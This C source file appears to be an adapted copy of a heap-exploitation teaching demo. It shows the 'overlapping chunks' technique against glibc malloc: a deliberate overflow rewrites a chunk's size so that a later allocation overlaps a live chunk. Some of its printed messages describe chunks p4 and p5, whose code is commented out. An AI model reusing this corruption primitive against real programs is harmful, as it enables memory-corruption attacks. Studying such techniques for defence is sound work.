/*
 Yet another simple tale of overlapping chunk.

 This technique is taken from
 https://loccs.sjtu.edu.cn/wiki/lib/exe/fetch.php?media=gossip:overview:ptmalloc_camera.pdf.
 
 This is also referenced as Nonadjacent Free Chunk Consolidation Attack.

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>

int main(){
  
  intptr_t *p1,*p2,*p3,*p4,*p5,*p6;
  unsigned int real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;
  int prev_in_use = 0x1;

  printf("\nThis is a simple chunks overlapping problem");
  printf("\nThis is also referenced as Nonadjacent Free Chunk Consolidation Attack\n");
  printf("\nLet's start to allocate 5 chunks on the heap:");

  p1 = malloc(0x100);
  p2 = malloc(0x100);
  p3 = malloc(0x80);
  // p4 = malloc(0x100);
  // p5 = malloc(0x100);

  real_size_p1 = malloc_usable_size(p1);
  real_size_p2 = malloc_usable_size(p2);
  real_size_p3 = malloc_usable_size(p3);
  // real_size_p4 = malloc_usable_size(p4);
  // real_size_p5 = malloc_usable_size(p5);

  printf("\n\nchunk p1 from %p to %p", p1, (unsigned char *)p1+malloc_usable_size(p1));
  printf("\nchunk p2 from %p to %p", p2,  (unsigned char *)p2+malloc_usable_size(p2));
  printf("\nchunk p3 from %p to %p", p3,  (unsigned char *)p3+malloc_usable_size(p3));
  // printf("\nchunk p4 from %p to %p", p4, (unsigned char *)p4+malloc_usable_size(p4));
  // printf("\nchunk p5 from %p to %p\n", p5,  (unsigned char *)p5+malloc_usable_size(p5));

  memset(p1,'A',real_size_p1);
  memset(p2,'B',real_size_p2);
  memset(p3,'C',real_size_p3);
  // memset(p4,'D',real_size_p4);
  // memset(p5,'E',real_size_p5);
  
  printf("\nLet's free the chunk p4.\nIn this case this isn't coealesced with top chunk since we have p5 bordering top chunk after p4\n"); 
  // 이거 안해도 된다.
  // free(p4);

  printf("\nLet's trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2\nwith the size of chunk_p2 + size of chunk_p3\n");

  *(unsigned int *)((unsigned char *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2; //<--- BUG HERE 

  printf("\nNow during the free() operation on p2, the allocator is fooled to think that \nthe nextchunk is p4 ( since p2 + size_p2 now point to p4 ) \n");
  printf("\nThis operation will basically create a big free chunk that wrongly includes p3\n");
  free(p2);
  
  printf("\nNow let's allocate a new chunk with a size that can be satisfied by the previously freed chunk\n");

  // p6 = malloc(0x198);  // p4가 있으면 이걸로.
  p6 = malloc(0x1d0);  // p4가 없으면 top이 p2가 되기 때문에 아무 size나 요청해도 p2가 반환된다.
  real_size_p6 = malloc_usable_size(p6);

  printf("\nOur malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and \nwe can overwrite data in p3 by writing on chunk p6\n");
  printf("\nchunk p6 from %p to %p", p6,  (unsigned char *)p6+real_size_p6);
  printf("\nchunk p3 from %p to %p\n", p3, (unsigned char *) p3+real_size_p3); 

  printf("\nData inside chunk p3: \n\n");
  printf("%s\n",(char *)p3); 

  printf("\nLet's write something inside p6\n");
  memset(p6,'F',0x180);  
  
  printf("\nData inside chunk p3: \n\n");
  printf("%s\n",(char *)p3); 


}
